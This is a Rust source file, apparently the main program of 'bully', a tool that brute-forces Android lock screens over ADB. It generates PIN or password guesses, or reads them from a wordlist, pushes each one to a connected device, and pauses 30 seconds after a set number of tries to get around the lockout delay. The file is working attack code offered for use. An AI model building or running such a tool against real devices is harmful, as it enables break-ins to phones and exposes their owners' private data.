use tracing::Level;
use tracing::{error, info, trace, warn};
use tracing_subscriber::FmtSubscriber;

use std::io::Write;
use std::thread;
use std::time;

use anyhow::Context;
use anyhow::Result;

use clap::Parser;

mod adb_dispatcher;
mod generators;
mod readers;

use generators::password::PasswdGenerator;
use generators::pin::PinGenerator;
use readers::password::PasswdReader;

use adb_dispatcher::Dispatcher;

#[derive(Default, Parser, Debug)]
#[clap(
    author = "nitrogenez",
    version,
    about = "An Android lock screen brute-force software"
)]
struct Cli {
    #[clap(long, short, help = "Brute-force mode (pin, passwd, file)")]
    // Choose the brute-force mode
    mode: String,

    #[clap(long, short, help = "Generated combination length")]
    // Generated combination length
    length: Option<usize>,

    #[clap(long, short, help = "Amount of brute-force retries")]
    // Amount of brute-force retries
    retries: Option<u32>,

    #[clap(long, short, help = "File path for file brute-force mode")]
    // File path for file brute-force mode
    file: Option<String>,

    #[clap(long, help = "Retries before 30 second sleep")]
    // Retries before 30 second sleep
    max: Option<u32>,
}

fn check_retries(
    retries: &u32,
    max_retries: &u32,
    attempts: &mut u32,
    adbdisp: &adb_dispatcher::Dispatcher,
) -> Result<()> {
    if retries % max_retries == 0 {
        warn!("Reached the retry limit of {}", max_retries);

        *attempts += 1;
        adbdisp.send_enter()?;

        let duration = time::Duration::from_secs(30);
        let mut remaining = duration.as_secs() as i32;

        while remaining > 0 {
            print!("\rSleeping. Estimated time: {:.0}s...", remaining);
            std::io::stdout().flush()?;
            thread::sleep(time::Duration::from_secs(1));
            remaining -= 1;
        }
        println!();
        info!("Timer exceeded, proceeding...");
        adbdisp.wake_device()?;
    }
    Ok(())
}

fn main() -> Result<()> {
    // Parse arguments
    let mut cli: Cli = Cli::parse();

    let t_subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(t_subscriber)
        .context("Failed to set the default tracing subscriber")?;

    trace!("Successfully set the default tracing subscriber");
    info!("Starting bully v{}...", env!("CARGO_PKG_VERSION"));

    // Analyze parsed arguments
    if cli.length.is_none() {
        cli.length = Some(4);
    }
    if cli.retries.is_none() {
        cli.retries = Some(9999);
    }
    if cli.max.is_none() {
        cli.max = Some(5);
    }

    info!(
        "Retries: {:?}, max: {:?}",
        cli.retries.unwrap(),
        cli.max.unwrap()
    );
    info!("Length: {:?}", cli.length.unwrap());
    info!("Launching adb dispatcher...");

    // ADB dispatcher
    let dispatcher = Dispatcher::new()?;

    match cli.mode.as_str() {
        "pin" => {
            info!("Setting up PIN brute-force mode...");

            let mut generator = PinGenerator::new(cli.length.unwrap());

            dispatcher.wake_device()?;

            let mut i: u32 = 1; // Retries
            let mut a: u32 = 1; // Attempts

            loop {
                if i >= cli.retries.unwrap() {
                    break;
                }

                // Generate and push
                generator.generate();
                dispatcher.push_pin(&generator)?;

                info!("R{i}A{a} - Pushed: {:?}", generator.combination);
                check_retries(&i, &cli.max.unwrap(), &mut a, &dispatcher)?;

                i += 1;
            }
        }
        "passwd" => {
            info!("Setting up password brute-force mode...");

            let mut generator = PasswdGenerator::new(cli.length);

            dispatcher.wake_device()?;

            let mut i: u32 = 1; // Retries
            let mut a: u32 = 1; // Attempts

            loop {
                if i >= cli.retries.unwrap() {
                    break;
                }

                // Generate and push
                generator.generate();
                dispatcher.push_passwd(&generator)?;

                info!("R{i}A{a} - Pushed: {:?}", generator.passwd_raw);
                check_retries(&i, &cli.max.unwrap(), &mut a, &dispatcher)?;

                i += 1;
            }
        }
        "file" => {
            info!("Setting up wordlist brute-force mode...");

            let mut reader = PasswdReader::new(&cli.file.unwrap_or("wordlist.txt".to_string()));

            reader.collect_passwords()?;
            dispatcher.wake_device()?;

            let mut i: u32 = 1;
            let mut a: u32 = 1;

            for passwd in reader.passwds.iter() {
                info!("R{i}A{a} - Pushed: {:?}", passwd);

                // Push data to the device
                dispatcher.push(passwd)?;
                dispatcher.send_enter()?;

                check_retries(&i, &cli.max.unwrap(), &mut a, &dispatcher)?;

                i += 1;
            }
            info!("EOF");
        }
        _ => {
            error!("Unknown mode: {:?}", cli.mode);
        }
    }
    info!("Exiting...");

    Ok(())
}
